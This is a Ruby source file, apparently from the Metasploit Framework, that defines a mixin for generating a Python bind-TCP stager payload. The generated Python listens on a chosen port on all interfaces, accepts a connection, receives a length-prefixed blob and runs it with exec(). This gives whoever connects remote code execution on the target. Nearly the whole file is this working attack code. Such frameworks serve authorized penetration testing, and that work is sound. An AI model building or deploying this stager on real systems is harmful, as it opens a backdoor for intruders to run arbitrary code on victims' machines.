# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/python/send_uuid'

module Msf

###
#
# Complex bind_tcp payload generation for Python
#
###

module Payload::Python::BindTcp

  include Msf::Payload::Python
  include Msf::Payload::Python::SendUUID

  #
  # Generate the first stage
  #
  def generate
    conf = {
      port: datastore['LPORT']
    }

    generate_bind_tcp(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  def transport_config(opts={})
    transport_config_bind_tcp(opts)
  end

  def generate_bind_tcp(opts={})
    # Set up the socket
    cmd  = "import socket,struct\n"
    cmd << "b=socket.socket(2,socket.SOCK_STREAM)\n" # socket.AF_INET = 2
    cmd << "b.bind(('0.0.0.0',#{opts[:port]}))\n"
    cmd << "b.listen(1)\n"
    cmd << "s,a=b.accept()\n"
    cmd << py_send_uuid if include_send_uuid
    cmd << "l=struct.unpack('>I',s.recv(4))[0]\n"
    cmd << "d=s.recv(l)\n"
    cmd << "while len(d)<l:\n"
    cmd << "\td+=s.recv(l-len(d))\n"
    cmd << "exec(d,{'s':s})\n"

    py_create_exec_stub(cmd)
  end

  def handle_intermediate_stage(conn, payload)
    conn.put([payload.length].pack("N"))
  end

end

end


